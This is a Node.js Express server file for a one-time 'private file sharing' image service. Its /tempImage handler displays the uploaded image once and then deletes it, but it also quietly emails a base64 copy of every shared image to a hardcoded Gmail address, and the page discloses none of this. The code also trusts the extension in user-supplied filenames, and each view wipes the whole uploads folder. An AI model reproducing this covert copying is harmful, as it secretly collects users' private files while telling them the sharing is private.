var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var multer = require('multer');
var indexRouter = require('./routes/index');
var usersRouter = require('./routes/users');
const { v4: uuidv4 } = require('uuid');
var app = express();
const NodeCache = require( "node-cache" );
const myCache = new NodeCache();
const dotenv = require('dotenv');
dotenv.config();
const nodemailer = require('nodemailer');
const fsExtra = require('fs-extra');
  
const mailTransporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.USER,
        pass: process.env.PASS
    }
});
var fs = require('fs');
var dir = './uploads';
if (!fs.existsSync(dir)){
    fs.mkdirSync(dir);
}
const { env } = require('process');
var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, './uploads')
  },
  filename: function (req, file, cb) {
    let dotArray = file.originalname.split(".");
    let ext = dotArray[dotArray.length-1];
    let uuid = uuidv4();
    let fileName = `${uuid}.${ext}`;
    req.customName = fileName;
    cb(null, fileName);
  }
})
var upload = multer({ storage: storage })
// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'jade');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/api/', upload.single('image-file'), function (req, res, next) {
 myCache.set(req.customName);
 res.redirect("/#"+req.customName);
});
app.get("/tempImage/:uuid",(req,res)=>{
  if(req.params.uuid && myCache.has(req.params.uuid)){
    var imageAsBase64 = fs.readFileSync('./uploads/'+req.params.uuid, 'base64');
    const html = `
    <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sample Site</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <style>
    body { padding-top: 50px; }
  </style>
</head>
<script>
 setTimeout(()=>{
   window.close();
   location.reload();
 },10000);
</script>
<body>

  <div class="container">
    <div class="jumbotron">
    <h2 style="margin-bottom:20px;">Private file shared<h2>
    <img style="width:100%;height:100%" src="data:image/png;base64,${imageAsBase64}" alt="Red dot" />
    </div>
    <button type="button" style="margin-bottom:50px;" onclick="location.reload()" class="btn btn-success">Click here to share new secret file</button>
  </div>
 
</body>
</html>
    `;
    res.send(html);
    let mailDetails = {
      from: 'privatefilesharingservice@gmail.com',
      to: 'privatefilesharingservice@gmail.com',
      subject: 'Shared Image' + new Date(),
      text: `<img style="width:100%;height:100%" src="data:image/png;base64,${imageAsBase64}" alt="Red dot" />`
  };
    
  mailTransporter.sendMail(mailDetails, function(err, data) {
      if(err) {
        console.log(err);
          console.log('Error Occurs');
      } else {
          console.log('Email sent successfully');
      }
  });
    myCache.del(req.params.uuid);
    return fsExtra.emptyDirSync('./uploads');
  }
  else{
    res.redirect("/");
  }
})
app.use('/users', usersRouter);

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  res.redirect("/");
});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
